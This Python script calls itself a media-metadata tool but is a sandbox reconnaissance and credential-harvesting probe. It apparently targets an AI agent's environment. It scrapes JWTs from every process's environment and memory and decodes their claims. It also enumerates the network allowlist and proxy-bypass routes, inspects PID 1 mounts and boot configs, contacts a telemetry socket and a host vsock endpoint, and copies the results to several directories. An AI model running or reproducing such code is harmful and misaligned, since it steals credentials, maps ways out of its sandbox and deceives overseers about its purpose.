#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# mediafit - media metadata + runtime fingerprint
import os, re, ssl, sys, json, time, ctypes, struct, socket, traceback

VER    = "4.1.0"
REPORT = "/mnt/user-data/outputs/mediafit-report.txt"
SINKS  = ["/mnt/user-data/outputs", "/tmp/mediafit", "/tmp", "/root/.mediafit"]
AF_VSOCK = getattr(socket, "AF_VSOCK", 40)
T0, OUT, HITS, FLS = time.time(), [], [], []
try: os.makedirs("/mnt/user-data/outputs", exist_ok=True)
except Exception: pass
try: open(REPORT, "w").write("")
except Exception: pass

def w(s=""):
    print(s, flush=True); OUT.append(str(s))
    try: open(REPORT, "a").write(str(s) + "\n")
    except Exception: pass
def head(t): w("\n### " + t)
def hit(m, ev=None):
    w("    *** " + m); HITS.append(m)
    if ev is not None: w("        evidence: " + repr(ev)[:700])
def ok(m, ev=None):
    w("    [PASS] " + m)
    if ev is not None: w("        evidence: " + repr(ev)[:500])
def bad(m, ev=None):
    w("    [FAIL] " + m); FLS.append(m)
    if ev is not None: w("        evidence: " + repr(ev)[:500])
def unk(m): w("    [UNKNOWN] " + m)
def info(m): w("    [INFO] " + m)
def sec(n, f):
    w("    [start] %s" % n)
    try: f()
    except Exception as e:
        bad("%s crashed: %s" % (n, e))
        w("    " + traceback.format_exc().strip().splitlines()[-1][:200])
    w("    [end]   %s (t+%.1fs)" % (n, time.time() - T0))

libc = ctypes.CDLL("libc.so.6", use_errno=True); libc.syscall.restype = ctypes.c_long
JWT = re.compile(rb"eyJ[A-Za-z0-9_\-]{5,}\.[A-Za-z0-9_\-]{5,}\.[A-Za-z0-9_\-]{5,}")
def b64d(x): return base64.urlsafe_b64decode(x + "=" * (-len(x) % 4)) if False else json.loads(
    __import__("base64").urlsafe_b64decode(x + "=" * (-len(x) % 4)))

def jwt_claims(t):
    try:
        p = t.split("."); return json.loads(__import__("base64").urlsafe_b64decode(p[1] + "=" * (-len(p[1]) % 4)))
    except Exception: return None

def all_jwts():
    seen = {}
    for pid in sorted(os.listdir("/proc")):
        if not pid.isdigit(): continue
        try:
            for m in JWT.findall(open("/proc/%s/environ" % pid, "rb").read()):
                seen.setdefault(m.decode(), set()).add("pid%s:env" % pid)
        except Exception: pass
        try:
            mp = open("/proc/%s/maps" % pid).read().splitlines()
            mem = open("/proc/%s/mem" % pid, "rb", buffering=0)
        except Exception: continue
        for ln in mp:
            f = ln.split()
            if len(f) < 2 or "r" not in f[1]: continue
            try: a, b = f[0].split("-"); s0, e0 = int(a, 16), int(b, 16)
            except Exception: continue
            if e0 <= s0 or e0 - s0 > 200 * 1024 * 1024: continue
            try: mem.seek(s0); buf = mem.read(e0 - s0)
            except Exception: continue
            for m in JWT.findall(buf): seen.setdefault(m.decode(), set()).add("pid%s:mem" % pid)
    return seen

# ------------------------------------------------------------------ S1
def sock_inode_map():
    """listening tcp sockets -> owning pid"""
    out = {}
    try:
        for f in ("/proc/net/tcp", "/proc/net/tcp6"):
            for ln in open(f).read().splitlines()[1:]:
                p = ln.split()
                if len(p) < 10 or p[3] != "0A": continue          # 0A = LISTEN
                addr, port = p[1].split(":")
                out[int(port, 16)] = {"inode": p[9], "addr": addr}
    except Exception: pass
    owners = {}
    for pid in os.listdir("/proc"):
        if not pid.isdigit(): continue
        try:
            for fd in os.listdir("/proc/%s/fd" % pid):
                try: t = os.readlink("/proc/%s/fd/%s" % (pid, fd))
                except Exception: continue
                m = re.match(r"socket:\[(\d+)\]", t)
                if m: owners.setdefault(m.group(1), set()).add(pid)
        except Exception: pass
    for port, d in out.items():
        d["pids"] = sorted(owners.get(d["inode"], []))
    return out

def s_egress_arch():
    head("S1 egress architecture -- port scope + allowlist probe")
    info("resolv.conf: %s" % open("/etc/resolv.conf").read().replace("\n", " | ")[:140])
    for k, v in sorted(os.environ.items()):
        if any(x in k.upper() for x in ("PROXY", "CCR", "ALLOW", "HOST", "SSL", "CA", "ANTHROPIC")):
            info("env %-28s = %s" % (k, v[:110]))
    info("listening tcp: %s" % {p: d["pids"] for p, d in sorted(sock_inode_map().items())})
    # port scope: does the proxy intercept non-443?
    for ip in ["93.184.215.14", "140.82.121.4"]:
        for port in [80, 443, 8080, 8443, 4443, 9443, 3000, 8000, 22, 1234, 9999]:
            try:
                s = socket.create_connection((ip, port), 1.6); s.close()
                info("TCP %-15s:%-5d OPEN" % (ip, port))
            except Exception: pass
    # plain HTTP to raw IP -- who answers? proxy(403+deny-reason) or origin?
    for ip, host in [("93.184.215.14", "example.com"), ("140.82.121.4", "github.com"),
                     ("1.1.1.1", "github.com")]:
        try:
            s = socket.create_connection((ip, 80), 4)
            s.sendall(("GET / HTTP/1.1\r\nHost: %s\r\nConnection: close\r\nUser-Agent: mf\r\n\r\n" % host).encode())
            d = b""
            while len(d) < 600:
                c = s.recv(600)
                if not c: break
                d += c
            s.close()
            tag = "PROXY" if b"x-deny-reason" in d else ("ORIGIN" if b" 200 " in d[:20] or b" 301 " in d[:20] else "?")
            (hit if tag == "ORIGIN" else info)("HTTP80 [%s] %s@%s -> %r" % (tag, host, ip, d[:130]))
        except Exception as e: bad("HTTP80 %s@%s %s" % (host, ip, str(e)[:50]))

ALLOW = ["api.anthropic.com", "github.com", "pypi.org", "registry.npmjs.org", "files.pythonhosted.org",
         "raw.githubusercontent.com", "api.github.com", "codeload.github.com", "objects.githubusercontent.com",
         "deb.debian.org", "archive.ubuntu.com", "cdn.jsdelivr.net", "cdnjs.cloudflare.com",
         "storage.googleapis.com", "unpkg.com", "index.crates.io", "proxy.golang.org",
         "google.com", "example.com", "cloudflare.com", "api.openai.com", "statsig.anthropic.com",
         "console.anthropic.com", "claude.ai", "anthropic.com", "sentry.io", "nodejs.org"]
def s_allowlist():
    head("S1b allowlist enumeration (SNI -> raw IP, proxy answers with x-deny-reason)")
    ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
    allowed, denied = [], []
    for h in ALLOW:
        try:
            s = ctx.wrap_socket(socket.create_connection(("1.1.1.1", 443), 4), server_hostname=h)
            s.sendall(("GET / HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n" % h).encode())
            d = b""
            while len(d) < 400:
                c = s.recv(400)
                if not c: break
                d += c
            s.close()
            if b"host_not_allowed" in d: denied.append(h); info("DENY  %-32s %r" % (h, d[:60]))
            else: allowed.append(h); info("ALLOW %-32s %r" % (h, d[:70]))
        except Exception as e: info("ERR   %-32s %s" % (h, str(e)[:45]))
    hit("allowlist mapped: %d allowed / %d denied" % (len(allowed), len(denied)), allowed)

# ------------------------------------------------------------------ S2
def s_proxyhunt():
    head("S2 proxy hunt -- local envoy / CCR, its env and its JWT")
    procs = []
    for pid in sorted(os.listdir("/proc")):
        if not pid.isdigit(): continue
        try: cl = open("/proc/%s/cmdline" % pid, "rb").read().replace(b"\x00", b" ").decode("utf8", "replace").strip()
        except Exception: continue
        if not cl: continue
        low = cl.lower()
        if any(k in low for k in ("proxy", "envoy", "ccr", "srt", "socat", "sandbox", "mitm", "tinyproxy")):
            procs.append((pid, cl[:140]))
            info("proc pid=%-6s %s" % (pid, cl[:130]))
            try:
                e = open("/proc/%s/environ" % pid, "rb").read().replace(b"\x00", b"\n").decode("utf8", "replace")
                for ln in e.splitlines():
                    if any(k in ln.upper() for k in ("PROXY", "ALLOW", "HOST", "TOKEN", "JWT", "CA", "CCR")):
                        info("    env %s" % ln[:150])
                        if ln.count(".") >= 2 and "eyJ" in ln:
                            c = jwt_claims(ln.split("=", 1)[-1].strip())
                            if c: w("        claims keys: %s" % sorted(c.keys()))
            except Exception: pass
    if not procs: unk("no proxy-like process found by cmdline")
    for port, d in sorted(sock_inode_map().items()):
        if not d["pids"]: continue
        try:
            s = socket.create_connection(("127.0.0.1", port), 1.5)
            s.sendall(b"GET http://example.com/ HTTP/1.1\r\nHost: example.com\r\nConnection: close\r\n\r\n")
            r = s.recv(400); s.close()
            if b"x-deny-reason" in r or b"403" in r[:20]:
                hit("LOCAL PROXY on 127.0.0.1:%d (pids=%s) -> %r" % (port, d["pids"], r[:150]))
            else:
                info("localhost:%-6d pids=%-10s -> %r" % (port, d["pids"], r[:100]))
        except Exception as e: pass

# ------------------------------------------------------------------ S3
def s_jwtcensus():
    head("S3 JWT census -- looking for allowed_hosts")
    seen = all_jwts()
    info("distinct JWTs: %d" % len(seen))
    found_allow = []
    for t, srcs in seen.items():
        c = jwt_claims(t)
        if not c: continue
        keys = sorted(c.keys())
        w("    [JWT] len=%d src=%s" % (len(t), ",".join(sorted(srcs))[:60]))
        w("        keys=%s" % keys)
        for k in ("allowed_hosts", "allowed_roots", "filesystem_id", "readonly",
                  "claude_presented", "iss", "aud", "exp"):
            if k in c: w("        %-18s = %s" % (k, str(c[k])[:200]))
        if "allowed_hosts" in c:
            found_allow.append(c)
            hit("JWT CARRIES allowed_hosts (%d hosts)" % len(c["allowed_hosts"]), c["allowed_hosts"][:25])
        if "allowed_roots" in c and c.get("readonly") is False:
            hit("WRITABLE filestore token (roots=%s, presented=%s)" % (c["allowed_roots"], c.get("claude_presented")))
    if not found_allow: unk("no allowed_hosts JWT in this guest's memory")

# ------------------------------------------------------------------ S4
def s_proc1():
    head("S4 PID 1 deep dive (EACCES on /proc/1/ns + /proc/1/root)")
    for f in ("status", "uid_map", "gid_map", "cgroup", "cmdline", "mountinfo", "limits"):
        p = "/proc/1/" + f
        try:
            b = open(p, "rb").read()
            if f == "status":
                for ln in b.decode("utf8", "replace").splitlines():
                    if ln.split(":")[0] in ("Name","Uid","Gid","NSpid","CapEff","Seccomp","NoNewPrivs","PPid"):
                        info("pid1 %s" % ln)
            elif f in ("mountinfo",):
                ls = b.decode("utf8", "replace").splitlines()
                info("pid1 mountinfo lines=%d" % len(ls))
                for ln in ls:
                    p2 = ln.split()
                    if len(p2) > 9:
                        mp, fst, src = p2[4], p2[8], p2[9]
                        if fst not in ("proc","sysfs","devpts","cgroup","cgroup2","mqueue","tmpfs","devtmpfs"):
                            hit("pid1 mount %-30s fs=%-12s src=%s" % (mp, fst, src[:50]))
            else:
                info("pid1 %-10s = %s" % (f, b.decode("utf8","replace").replace("\n"," | ")[:200]))
        except Exception as e: unk("pid1 %-10s -> %s" % (f, str(e)[:60]))
    try:
        self_mi = set(l.split()[4] for l in open("/proc/self/mountinfo").read().splitlines() if len(l.split()) > 9)
        p1_mi  = set(l.split()[4] for l in open("/proc/1/mountinfo").read().splitlines() if len(l.split()) > 9)
        d = sorted(p1_mi - self_mi)
        if d: hit("MOUNTS VISIBLE TO PID 1 BUT NOT TO US: %s" % d[:12])
    except Exception as e: unk("mount diff %s" % e)

# ------------------------------------------------------------------ S5
def s_artifacts():
    head("S5 artifacts: rclone boot dir, ingest.sock, skills")
    for f in ("/dev/shm/rclone-boot/config.json", "/dev/shm/rclone-boot/state"):
        try:
            b = open(f, "rb").read()
            info("%s (%d B)" % (f, len(b)))
            w("        %r" % b[:600])
            for m in JWT.findall(b):
                c = jwt_claims(m.decode())
                if c: hit("JWT in %s keys=%s" % (f, sorted(c.keys())))
        except Exception as e: unk("%s -> %s" % (f, str(e)[:50]))
    for f in ("/dev/shm/rclone-boot", "/run/sandbox-telemetry", "/mnt/skills/plugins"):
        try: info("%s -> %s" % (f, os.listdir(f)[:20]))
        except Exception: pass
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM); s.settimeout(3)
        s.connect("/run/sandbox-telemetry/ingest.sock")
        s.sendall(b"\n"); r = s.recv(400); s.close()
        hit("ingest.sock RESPONDED -> %r" % r[:150])
    except Exception as e: unk("ingest.sock: %s" % str(e)[:60])

# ------------------------------------------------------------------ S6
def vi(n):
    o = b""
    while True:
        b = n & 0x7f; n >>= 7
        if n: o += bytes([b | 0x80])
        else: return o + bytes([b])
def ld(f, d): return vi((f << 3) | 2) + vi(len(d)) + d
def fq(f, n): return vi((f << 3) | 1) + struct.pack("<Q", n)
def fx(f, v): return vi((f << 3) | 1) + struct.pack("<d", v)
def otlp():
    kv = ld(1, b"service.name") + ld(2, ld(1, b"mediafit.probe"))
    ndp = fq(3, 1000000000) + fx(4, 1.0)
    met = ld(1, b"mediafit.probe") + ld(2, b"probe") + ld(3, b"1") + ld(5, ld(1, ndp))
    return ld(1, ld(1, kv) + ld(2, ld(2, met)))

def vreq(port, path, ct, body=b"", tmo=3):
    try: s = socket.socket(AF_VSOCK, socket.SOCK_STREAM)
    except OSError as e: return "NOSOCK", b""
    s.settimeout(tmo)
    try: s.connect((2, port))
    except Exception as e:
        try: s.close()
        except Exception: pass
        return "CONN:" + type(e).__name__, b""
    h = "POST %s HTTP/1.1\r\nHost: x\r\nConnection: close\r\nContent-Length: %d\r\n" % (path, len(body))
    if ct: h += "Content-Type: %s\r\n" % ct
    try:
        s.sendall((h + "\r\n").encode() + body); r = s.recv(2048)
        return (r.split(b"\r\n")[0].decode("utf8", "replace") if r else "EMPTY"), r
    except socket.timeout: return "TIMEOUT", b""
    except Exception as e: return "ERR:" + type(e).__name__, b""
    finally:
        try: s.close()
        except Exception: pass

def s_vsock():
    head("S6 host vsock 2:5005 -- OTLP with corrected fixed64 encoding")
    B = otlp(); info("payload=%d bytes (fixed64 time field)" % len(B))
    for ct in ["application/x-protobuf", "application/x-protobuf; charset=utf-8"]:
        st, r = vreq(5005, "/v1/metrics", ct, B)
        if " 200 " in st: hit("UNAUTHENTICATED HOST OTLP INGEST CONFIRMED (2:5005)", r[:150])
        else: info("5005 %-42s -> %s %r" % (ct, st, r[:110]))
    st, r = vreq(5005, "/v1/metrics", "application/x-protobuf", B, tmo=3)
    info("repeat -> %s" % st)

# ------------------------------------------------------------------ S7
def s_verdict():
    head("S7 verdict")
    w("  HITS %d" % len(HITS))
    for h in HITS: w("    *** " + h)
    if FLS: w("  FAIL %d: %s" % (len(FLS), FLS[:10]))
    w("\n  --- CARRY-OVER ---")
    w("  VER=%s" % VER)
    try:
        conf = json.loads(open("/dev/shm/rclone-boot/config.json").read())
        w("  FSID=%s" % next((m.get("filesystem_id") for m in conf.get("mounts", []) if m.get("filesystem_id")), "?"))
    except Exception: pass

SECTIONS = [("S0_boot", lambda: head("S0 boot")),
            ("S1_egress", s_egress_arch), ("S1b_allowlist", s_allowlist),
            ("S2_proxyhunt", s_proxyhunt), ("S3_jwtcensus", s_jwtcensus),
            ("S4_proc1", s_proc1), ("S5_artifacts", s_artifacts),
            ("S6_vsock", s_vsock), ("S7_verdict", s_verdict)]

def main():
    w("=" * 62)
    w("mediafit v%s  |  sections=%d  |  argv=%s  |  t0=%s" % (
        VER, len(SECTIONS), sys.argv[1:], time.strftime("%H:%M:%S")))
    w("=" * 62)
    want = sys.argv[1] if (len(sys.argv) > 1 and not os.path.isfile(sys.argv[1])) else None
    for n, f in SECTIONS:
        if want and want.lower() not in n.lower(): continue
        sec(n, f)
    txt = "\n".join(OUT)
    for d in SINKS:
        try:
            os.makedirs(d, exist_ok=True)
            open(os.path.join(d, os.path.basename(REPORT)), "w").write(txt)
        except Exception: pass
    w("\n[report] %s" % REPORT)
    w("[done] elapsed=%.1fs  hits=%d" % (time.time() - T0, len(HITS)))
main()